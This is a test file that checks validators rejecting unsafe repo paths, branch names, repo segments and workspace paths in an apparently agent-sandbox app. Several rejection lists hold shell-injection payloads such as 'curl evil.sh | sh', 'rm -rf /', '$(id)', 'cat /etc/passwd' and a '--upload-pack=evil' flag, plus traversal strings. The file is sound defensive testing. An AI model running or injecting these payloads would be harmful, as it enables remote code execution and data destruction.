import { describe, it, expect } from "vitest"
import {
  isSafeRepoPath,
  isSafeBranchName,
  isSafeRepoSegment,
  isSafeWorkspacePath,
} from "./ref-validation"

describe("isSafeRepoPath", () => {
  it("accepts the app's real sandbox paths", () => {
    expect(isSafeRepoPath("/home/daytona/project")).toBe(true)
    expect(isSafeRepoPath("/workspace/repo-name.2")).toBe(true)
  })

  it("rejects shell-injection payloads and traversal", () => {
    for (const bad of [
      "/x; curl evil.sh | sh; #",
      "/x && rm -rf /",
      "/x`id`",
      "/x$(id)",
      "/x | cat /etc/passwd",
      "/x\nwhoami",
      "/home/../etc",
      "relative/path", // not absolute
      "",
      42,
      null,
      undefined,
    ]) {
      expect(isSafeRepoPath(bad as unknown)).toBe(false)
    }
  })
})

describe("isSafeBranchName", () => {
  it("accepts the app's real branch names", () => {
    for (const ok of ["main", "feat/token-track", "fix/security-issues", "release-1.2.3", "_cleanup/rebase-123"]) {
      expect(isSafeBranchName(ok)).toBe(true)
    }
  })

  it("rejects shell/URL metacharacters, flags and traversal", () => {
    for (const bad of [
      "main; rm -rf /",
      "$(id)",
      "`id`",
      "a|b",
      "a b",
      "a&b",
      "--upload-pack=evil",
      "-x",
      "/leading-slash",
      "trailing/",
      "a..b",
      "feature#frag",
      "",
      null,
    ]) {
      expect(isSafeBranchName(bad as unknown)).toBe(false)
    }
  })
})

describe("isSafeRepoSegment", () => {
  it("accepts real GitHub owners and repo names", () => {
    for (const ok of ["jamesmurdza", "background-agents", "next.js", "a_b-c.d"]) {
      expect(isSafeRepoSegment(ok)).toBe(true)
    }
  })

  it("rejects injection payloads and path separators", () => {
    for (const bad of ["a/b", "a; id", "$(id)", "a b", "-flag", "..", "owner`x`", ""]) {
      expect(isSafeRepoSegment(bad as unknown)).toBe(false)
    }
  })
})

describe("isSafeWorkspacePath", () => {
  it("accepts real repo-relative workspace directories", () => {
    for (const ok of [
      "workspaces/marketing-automation",
      "workspaces/lead-gen",
      "workspaces/a/b/c",
      "single",
      "a_b-c.d",
    ]) {
      expect(isSafeWorkspacePath(ok)).toBe(true)
    }
  })

  it("rejects absolute paths, which would escape the clone entirely", () => {
    for (const bad of ["/etc", "/home/daytona/project", "/"]) {
      expect(isSafeWorkspacePath(bad)).toBe(false)
    }
  })

  it("rejects traversal that would place the agent outside the workspace", () => {
    for (const bad of ["..", "../secrets", "workspaces/../../etc", "a/../../b"]) {
      expect(isSafeWorkspacePath(bad)).toBe(false)
    }
  })

  it("rejects shell metacharacters — the value is interpolated into a sandbox cwd", () => {
    for (const bad of [
      "a; curl evil.sh | sh",
      "a && rm -rf /",
      "a`id`",
      "a$(id)",
      "a | cat /etc/passwd",
      "a\nwhoami",
      "a b",
    ]) {
      expect(isSafeWorkspacePath(bad)).toBe(false)
    }
  })

  it("rejects empty, trailing-slash, over-long and non-string values", () => {
    for (const bad of ["", "trailing/", "a".repeat(401), 42, null, undefined, {}]) {
      expect(isSafeWorkspacePath(bad as unknown)).toBe(false)
    }
  })
})
